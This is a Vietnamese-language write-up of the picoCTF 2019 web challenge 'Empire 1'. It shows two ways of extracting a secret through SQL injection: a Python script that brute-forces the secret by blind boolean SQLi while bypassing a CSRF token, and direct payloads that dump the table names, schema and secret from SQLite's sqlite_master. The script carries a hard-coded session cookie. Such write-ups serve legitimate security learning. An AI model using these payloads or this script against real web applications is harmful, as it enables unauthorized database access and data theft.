#### Empire 1 ([Link](https://2019shell1.picoctf.com/problem/49726/))

- Nói ra thì đây là 1 bài khá khó chịu. Mình muốn giải bài này theo 2 cách

- Cách 1 thì là cách mình làm lấy flag trong thời gian giải còn hiện hành. Nói ra thì cách này khá là hãm, không đi theo đúng hướng đề đưa ra. *View source* lên thấy cái *csrf_token* thì là thấy nguời ra đề không muốn ta dùng tool nào để giải. Bắt buộc phải *dump* tay ra flag luôn. Tuy nhiên mình không tìm ra được kỹ thuật *dump* tay để ra flag luôn. Đành phải vượt qua *csrf_token* và dùng kỹ thuật *blind sql* để giải bài này. Tuy hãm nhưng ra được flag là ok rồi

- Cách 2 là cách dễ hơn rất nhiều so với cách, nhưng trong lúc thi mình không sử dụng nó, nói trắng ra là không biết sử dụng :v

- Cách 2 mình sẽ trình bày ở sau cùng

- OK, cách nào thì cũng là cách, ra flag là được. Bắt đầu chiến thôi

- Thử 1 số payload trước để cảm nhận, cuối cùng thì đây là payload đầu tiên mình nhận được kết quả theo ý muốn

  - Payload: `' OR 'admin' OR '`

- Phân tích payload 1 tý: Theo cảm nhận ban đầu của mình thì nó chỉ xuất ra các giá trị *boolean*, như payload trên nó trả về 0, tức là sai. Payload gắn vô query thì nó sẽ tựa tựa như thế này

  - `... WHERE '' OR 'admin' OR ''`
  - *Rỗng OR chữ OR rỗng* thì trả về false
  - Có thể *rỗng OR none OR rỗng* sẽ trả về none

- Giờ thì *fuzzing*  *columns* với *table* của nó dựa vào hint của đề. Không có 2 cái này thì chịu. Có thể tìm ra nhưng nó hơi mệt

- Sau 1 hồi *fuzzing* 1 hồi thì mình cũng đoán ra được *column* là *secret* và *table* là *user*

- OK, payload là:

  - `' OR (SELECT secret FROM user WHERE secret LIKE 'a%' LIMIT 1) OR '`

- Phân tích ra thì `LIKE` dùng để so sánh ký tự mình đoán, ở đây là `a`, `%` đại diện cho các ký tự phía sau

  - Nếu điều kiện đúng, query chạy, túc là nó sẽ *select* ra được 1 ký tự của *secret* và nó trở về kiểu *Rỗng OR chữ OR rỗng* thì trả về false
  - Nếu điều kiện sai, query không chạy, lúc đó nó sẽ là giá trị none và nó trở về kiểu *rỗng OR none OR rỗng* sẽ trả về none

- Tuy nhiên để viết ra 1 cái tool thì khá mệt. Ta cần lấy cookie của acc đã lập áp vào. Viết code lấy *csrf_token*  để xác thực. Phải qua vài lần gửi *requests* nên nó khá là lâu

- Đây là tool của mình:

  ```python
  import sys, requests, re
  from string import *
  
  char = ascii_lowercase + digits
  
  url = 'https://2019shell1.picoctf.com/problem/49726/'
  
  cookie = {
  	'session' : '.eJwlj1tqAzEMAO_i73zo6ZVymcWyZBoCLewmX6V3z0IPMMPMb9vXUedXu7-Od93a_sh2b-URIWCG4QvCQzS6GywkkEplHiFiApQVOlVrgMwyF45kRDPi8tURkNKZcUGPJctIS9gYNs2uPi6lBQnX1AE9UVhFvbzd2jyPtb9-nvV99SBRWYw5tPNGKDp9aZ-Vq3xuNTmJYMtxce-zjv8Jbn8fFI89_g.XaRLzA.8ImPk0CSbDfuM-jOpgByTnqbK_8'
  }
  
  url_add = url + 'add_item'
  
  url_list = url + 'list_items'
  
  listpass = ''
  
  flag = 0
  
  while True:
  
  	for x in char:
  		print('trying with: ', listpass+x)
  
  		response = requests.get(url_add, cookies = cookie)
  
  		fin = re.findall('type="hidden" value="(.*)">', response.text)
  
  		payload = "' or (SELECT secret FROM user WHERE secret LIKE 'picoCTF{"+listpass+x+"%}' limit 1) or '"
  
  		data = {
  			'csrf_token' : fin[0],
  			'item' : payload,
  			'submit' : 'Create'
  		}
  
  		response = requests.post(url_add, cookies = cookie, data =data)
  
  		response = requests.get(url_list, cookies = cookie)
  
  		fin = re.findall('Very Urgent:</strong>(.*)', response.text)
  
  		if fin[len(fin)-1] == ' 0':
  			listpass += x
  			print('sucess with: ', listpass)
  			flag = 0
  			break
  		else:
  			flag += 1
          if flag == 36:
              print('Success with secret: ', listpass)
              sys.exit()
  ```

- Payload mình dùng có yếu điểm là khi gặp ký tự `_` nó sẽ tự động set đúng, nên mình loại nó ra khỏi danh sách các ký tự có thể, đến khi nó hết chạy tức là sau đó là ký tự `_`

- Mạn phép không giải thích cái tool, có thể vừa xem vừa *research* để xem cách mình đã dùng để viết nên tool này

- OK, sau 1 hồi xài cái cách vãi chưởng này thì cũng ra được flag. Mạn phép không show, các bạn nên tự làm dựa theo hướng dẫn của mình. Thực ra mình lười chạy lại để lấy flag, với nó cũng khá là lâu :v


#  Cách 2 ( cách này rất nhanh nhưng trong lúc giải bài mình không làm cách này :v)

- Sau 1 hồi *fuzzing* thì mình biết đây là *sqlite*. Cho nên mình sẽ trích xuất data từ *sqlite_master*

- Về chi tiết thì mình sẽ trình bày trong phần *Allpayload* ở trên github của mình

- OK, giờ ta dump ra tên của *table*

  - Payload:

    ```mysql
    ' || (SELECT tbl_name FROM sqlite_master WHERE type='table') || '
    ```

    ![1](images/Selection_001.png)

- Tiếp theo mình sẽ *dump* ra câu *sql* để hình thành ra *table user* để tìm các *columns*

  - Payload:

    ```mysql
    ' || (SELECT sql FROM sqlite_master WHERE type='table' and tbl_name='user') || '
    ```

    ![2](images/Selection_002.png)

- OK, giờ ta để ý nhân vật chính là *username* và *secret*. Dựa theo hint của đề thì ta có thể thấy *flag* ở phần *secret* và *username* chính là tên ta đăng nhâp

- Bây giờ ta chỉ cần *dump data* của *secret* là xong

  - Payload:

    ```mysql
    ' || (SELECT secret FROM user WHERE username = 'kaito') || '
    ```

    ![3](images/Selection_003.png)

- Done, rất đơn giản đúng không. Đơn giản hơn rất nhiều so với cách mình trình bày phía trước. Vì vậy mình mới xây dựng *Allpayload* để tổng hợp tất cả lại, tránh những trường hợp ngu người như vầy nữa :v
